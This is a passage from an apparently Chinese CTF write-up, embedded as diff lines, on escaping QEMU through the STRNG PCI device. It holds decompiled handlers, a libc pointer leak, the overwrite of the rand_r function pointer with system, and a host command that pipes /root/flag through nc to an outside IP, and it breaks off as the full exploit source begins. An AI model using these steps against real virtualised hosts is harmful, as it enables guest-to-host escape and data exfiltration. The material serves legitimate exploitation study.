opaque-&gt;regs[1] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, uint64_t))opaque-&gt;rand)(opaque, v4, val);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( (unsigned int)v4 &lt; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( __readfsqword(0x28u) == v7 )</span><br><span class="line">        ((void (__fastcall *)(_QWORD))opaque-&gt;srand)((unsigned int)val);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( (_DWORD)v4 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = val;</span><br><span class="line">        v6 = ((__int64 (__fastcall *)(uint32_t *))opaque-&gt;rand_r)(&amp;opaque-&gt;regs[2]);</span><br><span class="line">        LODWORD(val) = v5;</span><br><span class="line">        opaque-&gt;regs[3] = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      opaque-&gt;regs[(unsigned int)v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面ida反编译错误的，上面的是rand函数是没有参数的（当然接下来贴的函数也会有这样的问题），</p>
+<p>这个函数也是需要size为4，而且地址最低两个bit都是0。</p>
+<p>上面对要写入的地址右移两个bit再进行判断，其实赋值的地址跟地址相关的是在最后一行，好像我们可以控制写入的地址，但是遗憾的是PCI设备内部会检查你写入的地址时不时在256字节范围</p>
+<h1 id="PMIO函数"><a href="#PMIO函数" class="headerlink" title="PMIO函数"></a>PMIO函数</h1><p>在前面查看pci设备的时候，我们已经知道I/O ports是映射在0xc050处的8个字节</p>
+<p>下面函数可以看到我们的地址只能是0或者4，那么就是对0xc050或者0xc054进行读写操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint64_t result; // rax</span><br><span class="line">  uint32_t v4; // edx</span><br><span class="line"></span><br><span class="line">  result = -1LL;</span><br><span class="line">  if ( size == 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( addr == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = opaque-&gt;addr;</span><br><span class="line">        if ( !(v4 &amp; 3) )</span><br><span class="line">          result = opaque-&gt;regs[v4 &gt;&gt; 2];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result = opaque-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是write的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t v4; // eax</span><br><span class="line">  __int64 v5; // rax</span><br><span class="line">  unsigned __int64 v6; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  if ( size == 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( addr == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = opaque-&gt;addr;</span><br><span class="line">        if ( !(v4 &amp; 3) )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v4 &gt;&gt; 2;</span><br><span class="line">          if ( (_DWORD)v5 == 1 )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[1] = ((__int64 (__fastcall *)(STRNGState *, signed __int64, uint64_t))opaque-&gt;rand)(</span><br><span class="line">                                opaque,</span><br><span class="line">                                4LL,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          else if ( (unsigned int)v5 &lt; 1 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( __readfsqword(0x28u) == v6 )</span><br><span class="line">              ((void (__fastcall *)(_QWORD))opaque-&gt;srand)((unsigned int)val);</span><br><span class="line">          &#125;</span><br><span class="line">          else if ( (_DWORD)v5 == 3 )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[3] = ((__int64 (__fastcall *)(uint32_t *, signed __int64, uint64_t))opaque-&gt;rand_r)(</span><br><span class="line">                                &amp;opaque-&gt;regs[2],</span><br><span class="line">                                4LL,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[v5] = val;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面可以看到，我们通过strng_pmio_write的addr为0分支（即写port：0xc050）控制opaque-&gt;addr，之后可以通过strng_pmio_read的<code>addr==4</code>分支可以任意读，通过strng_pmio_write的<code>addr==4</code>分支又可以任意写。</p>
+<p>所以就是写入0xc050就是写入到opaque-&gt;addr<br>写入0xc054就是将我们的val写到opaque-&gt;regs[opaque-&gt;addr &gt;&gt; 2] 位置</p>
+<p>uaf.io作者给出了一些访问port I/O的方法</p>
+<p>1、通过dd命令访问resource1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dd if=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 - read the index 0</span><br><span class="line">dd if=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 skip=1 - use index 0 as offset address to read from</span><br><span class="line">dd if=XXX of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 - write XXX to index 0</span><br><span class="line">dd if=XXX of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 skip=1 - use index 0 as offset to write to</span><br></pre></td></tr></table></figure>
+
+<p>2、通过dd命令访问/dev/port，不过由于/dev/port是字符设备，是一个字符一个字符访问的，所以不满足size==4的要求<br>3、当然还是通过in/out系列函数访问比较好</p>
+<p>下面是其中两个函数在io.h文件的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static __inline unsigned int</span><br><span class="line">inl (unsigned short int __port)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int _v;</span><br><span class="line"></span><br><span class="line">  __asm__ __volatile__ (&quot;inl %w1,%0&quot;:&quot;=a&quot; (_v):&quot;Nd&quot; (__port));</span><br><span class="line">  return _v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static __inline void</span><br><span class="line">outl (unsigned int __value, unsigned short int __port)</span><br><span class="line">&#123;</span><br><span class="line">  __asm__ __volatile__ (&quot;outl %0,%w1&quot;: :&quot;a&quot; (__value), &quot;Nd&quot; (__port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们需要权限才能访问端口，0x000-0x3ff可以用ioperm(from, num, turn_on)</p>
+<p>比如ioperm(0x300,5,1); 给 0x300 到 0x304 端口的访问权限</p>
+<p>但是更高的端口就要用iopl(3)来获得权限，这个可以获得范围所有端口权限。当然我们需要root用户来运行程序才行。</p>
+<p>in,out系列函数如下，分别是写入/读取一个字节（b结尾），两个字节（w结尾），四个字节（l结尾）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/io.h &gt;</span><br><span class="line"></span><br><span class="line">iopl(3); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用思路<br>1、通过strng_pmio_write和strng_pmio_read去泄露libc，因为STRNGState里面有三个函数指针<br>2、我们将我们要执行的命令通过strng_mmio_write写到对应的内存<br>3、最后我们将rand_r函数指针覆盖为system去执行我们的命令</p>
+<p>我们先调试看看内存，用dd命令向0xc050写入一个4吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ echo 4 &gt; test</span><br><span class="line">ubuntu@ubuntu:~$ sudo dd if=test of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1</span><br></pre></td></tr></table></figure>
+
+<p>那gdb这边就会断下来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread 4 &quot;qemu-system-x86&quot; hit Breakpoint 4, strng_pmio_write (opaque=0x555557e2b8c0, addr=0x0, val=0xa34, size=0x2) at /home/rcvalle/qemu/hw/misc/strng.c:91</span><br><span class="line">91	/home/rcvalle/qemu/hw/misc/strng.c: No such file or directory.</span><br></pre></td></tr></table></figure>
+
+<p>由于echo有换行所以数字4（0x34）后面会有0x0a，所以导致最终val时0xa34,而且size时2，所以我们还是写三个东西到test里面，加上换行就是4个了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ echo 666 &gt; test</span><br><span class="line">ubuntu@ubuntu:~$ sudo dd if=test of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1</span><br></pre></td></tr></table></figure>
+
+<p>看一下数据结构，可以看到我们操作的东西都在addr及后面地址，所以0xfa0偏移相当于我们的起始偏移（偏移为0的位置）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, copyof_3815)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000008F0 mmio            MemoryRegion_0 ?</span><br><span class="line">000009F0 pmio            MemoryRegion_0 ?</span><br><span class="line">00000AF0 addr            dd ?</span><br><span class="line">00000AF4 regs            dd 64 dup(?)</span><br><span class="line">00000BF4                 db ? ; undefined</span><br><span class="line">00000BF5                 db ? ; undefined</span><br><span class="line">00000BF6                 db ? ; undefined</span><br><span class="line">00000BF7                 db ? ; undefined</span><br><span class="line">00000BF8 srand           dq ?                    ; offset</span><br><span class="line">00000C00 rand            dq ?                    ; offset</span><br><span class="line">00000C08 rand_r          dq ?                    ; offset</span><br><span class="line">00000C10 STRNGState      ends</span><br></pre></td></tr></table></figure>
+
+<p>而randr_r距离addr时0x118</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0xc08-0xaf0)</span><br><span class="line">&apos;0x118&apos;</span><br></pre></td></tr></table></figure>
+
+<p>调试到 <code>0x555555964598 &lt;strng_pmio_write+120&gt;    mov    dword ptr [rdi + 0xaf0], edx</code>的<strong>下一行！！！</strong><br>查看内存，可以看到我们的666已经写进去了，包括换行，而且最后那三个就是srand，rand，rand_r函数指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /36gx $rdi + 0xaf0</span><br><span class="line">0x555557e2c3b0:	0x000000000a363636	0x0000000000000000</span><br><span class="line">0x555557e2c3c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c3d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c3e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c3f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c400:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c490:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c4a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555557e2c4b0:	0x0000000000000000	0x00007ffff65268d0</span><br><span class="line">0x555557e2c4c0:	0x00007ffff6526f60	0x00007ffff6526f70</span><br></pre></td></tr></table></figure>
+
+<p>我们先泄露srand的值（即上面的0x00007ffff65268d0），由于我用的是ubuntu 16.04运行的qemu，所以我们泄露两次，一次泄露4个字节，先看看偏移</p>
+<p>泄露的代码是<code>result = opaque-&gt;regs[v4 &gt;&gt; 2];</code>，所以偏移是相对于opaque-&gt;regs，regs偏移是0xaf4，而且regs是uint_t32数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /wx $rdi + 0xaf4 + 0x104</span><br><span class="line">0x555557e2c4b8:	0xf65268d0</span><br><span class="line">gdb-peda$ x /wx $rdi + 0xaf4 + 0x108</span><br><span class="line">0x555557e2c4bc:	0x00007fff</span><br></pre></td></tr></table></figure>
+
+<p>泄露简析：</p>
+<p>先写好pmio的读和写</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> addr)</span> </span>&#123;</span><br><span class="line">    outl(val, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (offset == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取opaque-&gt;addr的值,其实这题没用到这功能</span></span><br><span class="line">        <span class="keyword">return</span> inl(pmio_base);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 设置opaque-&gt;addr的值为offset，再将opaque-&gt;regs[offset &gt;&gt; 2]的值读出，其中regs为uint_32_t类型</span></span><br><span class="line">        pmio_write(offset, pmio_base);</span><br><span class="line">        <span class="keyword">return</span> inl(pmio_base + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后我们就可以读取了</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != iopl(<span class="number">3</span>)) &#123;</span><br><span class="line">       perror(<span class="string">"iopl permissions"</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// leak srand, 分两次一次泄露4个byte</span></span><br><span class="line">   <span class="comment">// 泄露高位，再泄露低位</span></span><br><span class="line">   srand_addr = pmio_read(<span class="number">0x108</span>);</span><br><span class="line">   srand_addr = srand_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">   srand_addr = srand_addr | pmio_read(<span class="number">0x104</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"srand_addr: %llx\n"</span>, srand_addr);</span><br></pre></td></tr></table></figure>
+
+<p>我们看看调试中状态，先往<code>opaque-&gt;addr</code>写入0x108</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /gx $rdi +0xaf0</span><br><span class="line">0x555557e2c3b0:	0x0000000000000108</span><br></pre></td></tr></table></figure>
+
+<p>再到<code>strng_pmio_read</code>那里泄露出来</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x555555964501</span> &lt;strng_pmio_read+<span class="number">81</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span> + <span class="built_in">rdx</span>*<span class="number">4</span> + <span class="number">0xaf4</span>]</span><br></pre></td></tr></table></figure>
+
+<p>查看下内存，先泄露的高4为，同理低四位也如此</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /wx $rdi + $rdx*4 + 0xaf4</span><br><span class="line">0x555557e2c4bc:	0x00007fff</span><br></pre></td></tr></table></figure>
+
+<p>那我们就可以获得srand的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ sudo ./exp</span><br><span class="line">srand_addr: 7ffff65268d0</span><br></pre></td></tr></table></figure>
+
+<p>接下里是我们写入的命令<code>&quot;cat /root/flag | nc 192.168.52.181 12345&quot;</code>，ip端口自行修改，但是总长度最好是4的倍数，不然最后自己补\x00了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; map(hex, unpack_many(&quot;cat /root/flag | nc 192.168.52.181 12345&quot;))</span><br><span class="line">[&apos;0x20746163&apos;, &apos;0x6f6f722f&apos;, &apos;0x6c662f74&apos;, &apos;0x7c206761&apos;, &apos;0x20636e20&apos;, &apos;0x2e323931&apos;, &apos;0x2e383631&apos;, &apos;0x312e3235&apos;, &apos;0x31203138&apos;, &apos;0x35343332&apos;]</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是我们写入0xc偏移的时候，会进入到rand_r分支，导致opaque-&gt;regs[2]的位置被更改，不信看看rand_r的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">rand_r (unsigned int *seed)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int next = *seed;</span><br><span class="line">  int result;</span><br><span class="line">  next *= 1103515245;</span><br><span class="line">  next += 12345;</span><br><span class="line">  result = (unsigned int) (next / 65536) % 2048;</span><br><span class="line">  next *= 1103515245;</span><br><span class="line">  next += 12345;</span><br><span class="line">  result &lt;&lt;= 10;</span><br><span class="line">  result ^= (unsigned int) (next / 65536) % 1024;</span><br><span class="line">  next *= 1103515245;</span><br><span class="line">  next += 12345;</span><br><span class="line">  result &lt;&lt;= 10;</span><br><span class="line">  result ^= (unsigned int) (next / 65536) % 1024;</span><br><span class="line">  *seed = next; &lt;=================================就是这里会更改传进的seed</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以这样写是有问题的，知道参考文章为何掉转过来了吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmio_write(0x20746163, 8);</span><br><span class="line">mmio_write(0x6f6f722f, 0xc);</span><br></pre></td></tr></table></figure>
+
+<p>要这样写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mmio_write(0x6f6f722f, 0xc);</span><br><span class="line">   mmio_write(0x20746163, 8);</span><br><span class="line">   mmio_write(0x6c662f74, 0x10);</span><br><span class="line">   mmio_write(0x7c206761, 0x14);</span><br><span class="line">   mmio_write(0x20636e20, 0x18);</span><br><span class="line">   mmio_write(0x2e323931, 0x1c);</span><br><span class="line">   mmio_write(0x2e383631, 0x20);</span><br><span class="line">   mmio_write(0x312e3235, 0x24);</span><br><span class="line">   mmio_write(0x31203138, 0x28);</span><br><span class="line">   mmio_write(0x35343332, 0x2c);</span><br></pre></td></tr></table></figure>
+
+<p>最后就是改写rand_r指针，调用rand_r了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	// 改写rand_r指针为system</span><br><span class="line">   pmio_arb_write(system_addr , 0x114);</span><br><span class="line">//调用opaque-&gt;rand_r(&amp;opaque-&gt;regs[2])</span><br><span class="line">//// 666 并不重要可以随意写</span><br><span class="line">mmio_write(666, 12);</span><br></pre></td></tr></table></figure>
+
+<p>调用rand_r通过pmio也行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 或者调用pmio也行(下面的666也是随意)</span><br><span class="line">    pmio_write(12, pmio_base);</span><br><span class="line">    pmio_write(666, pmio_base+4);</span><br></pre></td></tr></table></figure>
+
+<p>最终完整exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;termios.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/io.h&gt;</span><br><span class="line"></span><br><span class="line">#define MAP_SIZE 4096UL</span><br><span class="line">#define 